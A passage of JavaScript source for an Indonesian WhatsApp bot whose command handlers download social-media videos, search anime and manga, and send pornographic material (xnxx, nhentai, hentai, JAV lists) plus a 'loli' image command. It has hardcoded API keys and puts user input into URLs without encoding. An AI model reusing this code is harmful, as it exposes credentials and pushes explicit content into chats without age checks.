             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (!q) return reply('Linknya?')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             reply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.watermark) })
            .catch((err) => { reply(String(err)) })
             break
      case 'ttnowm': 
      case 'tiktoknowm':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (!q) return reply('Linknya?')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             reply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.nowatermark) })
            .catch((err) => { reply(String(err)) })
             break

  case 'xnxxsearch':
                    if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=genbotkey&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'xnxx':
                    if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=genbotkey&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(", ")}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += "Link : \n"
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await Hisnu.sendMessage(from, thumbnail, image, { quoted: lol, caption: ini_txt })
                    break

              /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://Hisnu-chan02.github.io`)
              case 'tiktok':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return reply('Linknya?')
              if (!q.includes('tiktok')) return reply(mess.error.Iv)
              buttons = [{buttonId: `${prefix}tiktoknowm ${q}`,buttonText:{displayText: `🎥 Video`},type:1},{buttonId:`${prefix}ttaudio ${q}`,buttonText:{displayText:'🎵 Mp3'},type:1}]
              imageMsg = (await Hisnu.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/Menu.jpg`)})).imageMessage
              buttonsMessage = {footerText:'㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧', imageMessage: imageMsg,
              contentText:`Silahkan pilihan media yg mau di download kak:v`,buttons,headerType:4}
              prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              Hisnu.relayWAMessage(prep)
              break
      case 'ttaudio': 
      case 'tiktokmusic': 
      case 'tiktokaudio':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
             ini_link = args[0]
             get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${setting.lolkey}&url=${ini_link}`)
             Hisnu.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek })
             break
      case 'fb':
      case 'facebook':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (!q) return
             reply(mess.wait)
             try {
             anu = await fetchJson(`https://zenzapi.xyz/api/downloader/facebook?url=${args[0]}&apikey=0963ec745dde`)
             sendMediaURL(from, anu.result.hd)
             } catch (e) {
             console.log(e)
             reply(`${e}`)
}
             break
      case 'twitter':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
             if (!q) return reply('Linknya?')
             ten = args[0]
             var res = await twitterGetUrl(`${ten}`)
            .then(g => {
             ren = `${g.download[2].url}`
             sendMediaURL(from,ren,'Done')
})
             break
      case 'b':
      case 'brainly':
             brainly(args.join(" ")).then(res => {
             hmm = '────────────\n'
             for (let Y of res.data) {
             hmm += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`
}
             reply(hmm)
             console.log(res)
})
             break
      case 'ssweb':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/`)
             ini_link = args[0]
             ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${setting.lolkey}&url=${ini_link}`)
             await Hisnu.sendMessage(from, ini_buffer, image, { quoted: mek })
             break
       case 'nhentaipdf':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)
             if (isNaN(Number(args[0]))) return await reply(mess.wrongFormat)
             try {
             henid = args[0]
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${setting.lolkey}`)
             get_result = get_result.result
             get_info = get_result.info
             teks = `\n${get_result.title_romaji}\n\n${get_result.title_native}\n\nCharacter : ${get_info.characters.join(", ")}\n`
             ini_image = await getBuffer(get_result.image[0])
             Hisnu.sendMessage(from, ini_image, image, { caption: teks, quoted: mek })
             anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${setting.lolkey}`)
             pdf = await getBuffer(anu.result)
             Hisnu.sendMessage(from, pdf, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${get_result.title_romaji}.pdf`, thumbnail: ini_image })
             } catch (e) {
             console.log(e)
             reply(String(e))
}
             break
       case 'nhentai':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
              reply(mess.wait)
              henid = args[0]
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${setting.lolkey}`)
              get_result = get_result.result
              ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
              ini_txt += `Title Native : ${get_result.title_native}\n`
              ini_txt += `Read Online : ${get_result.read}\n`
              get_info = get_result.info
              ini_txt += `Parodies : ${get_info.parodies}\n`
              ini_txt += `Character : ${get_info.characters.join(", ")}\n`
              ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
              ini_txt += `Artist : ${get_info.artists}\n`
              ini_txt += `Group : ${get_info.groups}\n`
              ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
              ini_txt += `Categories : ${get_info.categories}\n`
              ini_txt += `Pages : ${get_info.pages}\n`
              ini_txt += `Uploaded : ${get_info.uploaded}\n`
              reply(ini_txt)
              break
       case 'manga':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
              reply(mess.wait)
              query = args.join(" ")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${setting.lolkey}&query=${query}`)
              get_result = get_result.result
              ini_txt = `Id : ${get_result.id}\n`
              ini_txt += `Id MAL : ${get_result.idMal}\n`
              ini_txt += `Title : ${get_result.title.romaji}\n`
              ini_txt += `English : ${get_result.title.english}\n`
              ini_txt += `Native : ${get_result.title.native}\n`
              ini_txt += `Format : ${get_result.format}\n`
              ini_txt += `Chapters : ${get_result.chapters}\n`
              ini_txt += `Volume : ${get_result.volumes}\n`
              ini_txt += `Status : ${get_result.status}\n`
              ini_txt += `Source : ${get_result.source}\n`
              ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
              ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
              ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
              ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
              ini_txt += `Score : ${get_result.averageScore}%\n`
              ini_txt += `Characters : \n`
              ini_character = get_result.characters.nodes
              for (var x of ini_character) {
              ini_txt += `- ${x.name.full} (${x.name.native})\n`
}
              ini_txt += `\nDescription : ${get_result.description}`
              thumbnail = await getBuffer(get_result.coverImage.large)
              await Hisnu.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
              break
       case 'doujindesu':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (!q) return reply(mess.wrongFormat)
             reply(mess.wait)
             try {
             doujinnya = await got.get(`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${q}&apiKey=administrator`).json()
             let { data } = await doujinnya
             xixixai = `*Doujindesu Search*\n`
             for (let i = 0; i < data.length; i++) {
             xixixai += `\n*Urutan ${i+1}*\n*Title:* ${data[i].title}\n*Type:* ${data[i].type}\n*Status:* ${data[i].status}\n*Rating:* ${data[i].rating}\n*Followers:* ${data[i].followers}\n`
}
             buffer = await getBuffer(data[0].thumb)
             Hisnu.sendMessage(from, buffer, image, {caption: xixixai, quoted: mek})
             } catch (e) {
             console.log(e)
             reply(String(e))
}
             break      
     case 'anime':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
             reply(mess.wait)
             query = args.join(" ")
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${setting.lolkey}&query=${query}`)
             get_result = get_result.result
             ini_txt = `Id : ${get_result.id}\n`
             ini_txt += `Id MAL : ${get_result.idMal}\n`
             ini_txt += `Title : ${get_result.title.romaji}\n`
             ini_txt += `English : ${get_result.title.english}\n`
             ini_txt += `Native : ${get_result.title.native}\n`
             ini_txt += `Format : ${get_result.format}\n`
             ini_txt += `Episodes : ${get_result.episodes}\n`
             ini_txt += `Duration : ${get_result.duration} mins.\n`
             ini_txt += `Status : ${get_result.status}\n`
             ini_txt += `Season : ${get_result.season}\n`
             ini_txt += `Season Year : ${get_result.seasonYear}\n`
             ini_txt += `Source : ${get_result.source}\n`
             ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
             ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
             ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
             ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
             ini_txt += `Score : ${get_result.averageScore}%\n`
             ini_txt += `Characters : \n`
             ini_character = get_result.characters.nodes
             for (var x of ini_character) {
             ini_txt += `- ${x.name.full} (${x.name.native})\n`
 }
             ini_txt += `\nDescription : ${get_result.description}`
             thumbnail = await getBuffer(get_result.coverImage.large)
             await Hisnu.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
             break
      case 'kusonime':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
             reply(mess.wait)
             query = args.join(" ")
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${setting.lolkey}&query=${query}`)
             get_result = get_result.result
             ini_txt = `Title : ${get_result.title}\n`
             ini_txt += `Japanese : ${get_result.japanese}\n`
             ini_txt += `Genre : ${get_result.genre}\n`
             ini_txt += `Seasons : ${get_result.seasons}\n`
             ini_txt += `Producers : ${get_result.producers}\n`
             ini_txt += `Type : ${get_result.type}\n`
             ini_txt += `Status : ${get_result.status}\n`
             ini_txt += `Total Episode : ${get_result.total_episode}\n`
             ini_txt += `Score : ${get_result.score}\n`
             ini_txt += `Duration : ${get_result.duration}\n`
             ini_txt += `Released On : ${get_result.released_on}\n`
             ini_txt += `Desc : ${get_result.desc}\n`
             link_dl = get_result.link_dl
             for (var x in link_dl) {
             ini_txt += `\n${x}\n`
             for (var y in link_dl[x]) {
             ini_txt += `${y} - ${link_dl[x][y]}\n`
}
}
             ini_buffer = await getBuffer(get_result.thumbnail)
             await Hisnu.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
             break
       case 'otakudesu':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
              reply(mess.wait)
              query = args.join(" ")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${setting.lolkey}&query=${query}`)
              get_result = get_result.result
              ini_txt = `Title : ${get_result.title}\n`
              ini_txt += `Japanese : ${get_result.japanese}\n`
              ini_txt += `Judul : ${get_result.judul}\n`
              ini_txt += `Type : ${get_result.type}\n`
              ini_txt += `Episode : ${get_result.episodes}\n`
              ini_txt += `Aired : ${get_result.aired}\n`
              ini_txt += `Producers : ${get_result.producers}\n`
              ini_txt += `Genre : ${get_result.genres}\n`
              ini_txt += `Duration : ${get_result.duration}\n`
              ini_txt += `Studios : ${get_result.status}\n`
              ini_txt += `Rating : ${get_result.rating}\n`
              ini_txt += `Credit : ${get_result.credit}\n`
              get_link = get_result.link_dl
              for (var x in get_link) {
              ini_txt += `\n\n*${get_link[x].title}*\n`
              for (var y in get_link[x].link_dl) {
              ini_info = get_link[x].link_dl[y]
              ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
              ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
              ini_txt += `\`\`\`Link : \`\`\`\n`
              down_link = ini_info.link_dl
              for (var z in down_link) {
              ini_txt += `${z} - ${down_link[z]}\n`
}
}
}
              reply(ini_txt)
              break
       case 'nekopoi':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
              ini_url = args[0]
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${setting.lolkey}&url=${ini_url}`)
              get_result = get_result.result
              ini_txt = `\`\`\`▢ Title : ${get_result.anime}\`\`\`\n`
              ini_txt += `\`\`\`▢ Porducers : ${get_result.producers}\`\`\`\n`
              ini_txt += `\`\`\`▢ Duration : ${get_result.duration}\`\`\`\n`
              ini_txt += `\`\`\`▢ Size : ${get_result.size}\`\`\`\n`
              ini_txt += `\`\`\`▢ Sinopsis : ${get_result.sinopsis}\`\`\`\n`
              link = get_result.link
              for (var x in link) {
              ini_txt += `\n${link[x].name}\n`
              link_dl = link[x].link
              for (var y in link_dl) {
              ini_txt += `${y} - ${link_dl[y]}\n`
}
}
              ini_buffer = await getBuffer(get_result.thumb)
              await Hisnu.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
              break
       case 'nekopoisearch':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
              query = args.join(" ")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${setting.lolkey}&query=${query}`)
              get_result = get_result.result
              ini_txt = ""
              for (var x of get_result) {
              ini_txt += `\`\`\`▢ Title : ${x.title}\`\`\`\n`
              ini_txt += `\`\`\`▢ Link : ${x.link}\`\`\`\n`
              ini_txt += `\`\`\`▢ Thumbnail : ${x.thumbnail}\`\`\`\n\n`
}
              reply(ini_txt)
              break
       case 'kanna':
       case 'wallnime':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${setting.lolkey}`).then((gambar) => {
              Hisnu.sendMessage(from, gambar, image, { quoted: mek, thumbnail: Buffer.alloc(0) })
})
              break
       case 'sagiri':
              reply(mess.wait)
              loli = await getBuffer(`https://xdev-api.herokuapp.com/sagiri`)
              Hisnu.sendMessage(from, loli, image, {quoted: ftroli})
              break       
       case 'megumin':
              reply(mess.wait)
              loli = await getBuffer(`https://xdev-api.herokuapp.com/megumin`)
              Hisnu.sendMessage(from, loli, image, {quoted: ftroli})
              break       
       case 'neko':
              reply(mess.wait)
              loli = await getBuffer(`https://xdev-api.herokuapp.com/neko`)
              Hisnu.sendMessage(from, loli, image, {quoted: ftroli})
              break
       case 'hentai':
       if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${setting.lolkey}`).then((gambar) => {
              Hisnu.sendMessage(from, gambar, image, { quoted: mek })
}) 
              break
       case 'nakanoitsuki':
       case 'nakanoHisnu':
       case 'nakanomiku':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              res = await axios.get(`https://fdciabdul.tech/api/pinterest?keyword=${command}`)
              var string = JSON.parse(JSON.stringify(res.data))
              var random =  string[Math.floor(Math.random() * string.length)]
              sendFileFromUrl(random, image, {quoted: mek, thumbnail: Buffer.alloc(0), caption: `*Wangy²*`})
              break
       case 'storyanime':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              anu = await fetchJson(`https://lolhuman.herokuapp.com/api/storynime?apikey=${setting.lolkey}`)
              buffer = await getBuffer(anu.result)
              Hisnu.sendMessage(from, buffer, video, { quoted: mek })
              break
       case 'nekopoi3d':
       case '3dnekopoi':
       case '3dnekopoilast':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              try {
              bsangee = await axios.get(`https://api.vhtear.com/neko3d&apikey=${setting.vhtearkey}`)
              bsangee2 = bsangee.data
              keluarplay = `*List update 3D JAV*\n`
              for (let i = 0; i < bsangee2.result.length; i++) {
              keluarplay += `\n═════════════════\n\n*Judul* : ${bsangee2.result[i].title}\n*Deskripsi* : ${bsangee2.result[i].description}\n*Link* : ${bsangee2.result[i].url}\n`
}
              reply(keluarplay) 
              } catch (err) {
              console.log(err)
              reply('error!')
}
               break
        case 'nekopoijav':
        case 'javnekopoi':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               reply(mess.wait)
               try {
               bsangce = await axios.get(`https://api.vhtear.com/nekojavlist&apikey=${setting.vhtearkey}`)
               bsangce2 = bsangce.data
               keluarplay = `*List update JAV*\n`
               for (let i = 0; i < bsangce2.result.length; i++) {
               keluarplay += `\n═════════════════\n\n*Judul* : ${bsangce2.result[i].title}\n*Serial JAV* : ${bsangce2.result[i].seri}\n*Link* : ${bsangce2.result[i].url}\n`
}
               reply(keluarplay)
               } catch (err) {
               console.log(err)
}
               break
        case 'nekopoicosplay':
        case 'cosplaynekopoi':
               try {
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               reply(mess.wait)
               bsangbe = await axios.get(`https://api.vhtear.com/nekojavcosplay&apikey=${setting.vhtearkey}`)
               bsangbe2 = bsangbe.data
               keluarplay = `*List update Cosplay JAV*\n`
               for (let i = 0; i < bsangbe2.result.length; i++) {
               keluarplay += `\n═════════════════\n\n*Judul* : ${bsangbe2.result[i].title}\n*Deskripsi* : ${bsangbe2.result[i].detail}\n*Link* : ${bsangbe2.result[i].url}\n`
}
               reply(keluarplay)
               } catch (err) {
               console.log(err)
}
               break
        case 'otakuongoing': 
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')             
               o = await onGoing()
               console.log(o)
               ot = '*「 Ongoing Otakudesu 」*'
               for (let i = 0; i < o.length; i++) {
               ot += `\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
}
               buff = await getBuffer(o[0].thumb)
               Hisnu.sendMessage(from, buff, image, {quoted: mek, caption: ot})
               break
            case 'waifu':
if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')            
v = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
inifile = sendMediaURL(from, v.url, )
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
              imageMsg = ( await Hisnu.prepareMessage(from, inifile, 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              Hisnu.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
break
       case 'loli':
       case 'husbu':
       case 'milf':
       case 'cosplay':
       case 'wallml':
              /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://Hisnu-chan02.github.io`)
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
              imageMsg = ( await Hisnu.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'㋡𝐾𝑢𝑛𝑧𝐵𝑜𝑡𝑧', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              Hisnu.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
        case 'playy':
case 'lagu':
if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
teks = args.join(' ')
reply(mess.wait)
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(` Playing ${res.all[0].title}`)
let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
/////////////sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, audio, {quoted: mek, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
const tec = teks.split("-doc")
res = await yts(`${tec}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`.Playing ${res.all[0].title}`)
let thumbInfo = `*${botname}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
}
break
case 'play2':   
                if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
		  	    if (args.length < 1) return reply('*Masukan judul nya?*')
                reply('Loading.... ')
				play = args.join(" ")
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=apivinz`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*「 PLAY VIDEO 」*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
				///////buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.result.url_video)
				Hisnu.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:freply, caption: 'Nih Gan'})
					break  
					
					// case 'ytdl':
					// case 'play':
			  // /////////////////////////////////////////////////////////////////////////////////////////////////////////////////if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://Hisnu-chan02.github.io`)
             // if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             // if (!q) return reply('Linknya?')
			 // res = await yts(q)
			   // let thumbInfo = ` 
// *Youtube Download*
 // *Judul :* ${res.all[0].title}
 // *ID Video :* ${res.all[0].videoId}
 // *Diupload Pada :* ${res.all[0].ago}
 // *Views :* ${res.all[0].views}
 // *Durasi :* ${res.all[0].timestamp}
 // *Channel :* ${res.all[0].author.name}
// *Link Channel :* ${res.all[0].author.url}
// 
// *Silahkan pilih media yang akan di download*
// `
// buttons = [{buttonId:`${prefix}play2 ${q}`,buttonText:{displayText:'🎥VIDEO'},type:1},{buttonId:`${prefix}playy ${q}`,buttonText:{displayText:'🎵AUDIO'},type:1}]
// 
// imageMessage = (await Hisnu.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage
// 
// buttonsMessage = {contentText: thumbInfo,footerText:'Silahkan Pilih Jenis File Dibawah Ini',imageMessage,buttons,headerType:4}
// 
// prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{})
// 
// Hisnu.relayWAMessage(prep)
// break
					
          case 'lirik':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (!q) return reply(mess.wrongFormat)
               reply(mess.wait)
               lirikLagu(q).then((res) => {
               let lirik = `Lirik Lagu ${q}

               ${res[0].result}
`
               reply(lirik)
})
               break
       case 'pinterest':
               if (args.length == 0) return reply(`Yang Mau Di Cari Apa??`)
               pinterest(`${c}`).then( data => {
               const amsulah = data.result
               const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
               sendMediaURL (from ,pimterest , `Pinterest : ${c}`)
               })
               break
        case 'shopee':
               try {
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (args.length == 0) return reply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)
               query = args.join(" ")
               reply(mess.wait)
               get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${setting.zekskey}&q=${query}`)
               get_data = get_data.data
               teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *SHOPEE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_data.length; i++) {
teks += `\`\`\`▢ Nama : ${get_data[i].name}\`\`\`
\`\`\`▢ Harga : ${get_data[i].harga}\`\`\`
\`\`\`▢ Terjual : ${get_data[i].terjual}\`\`\`
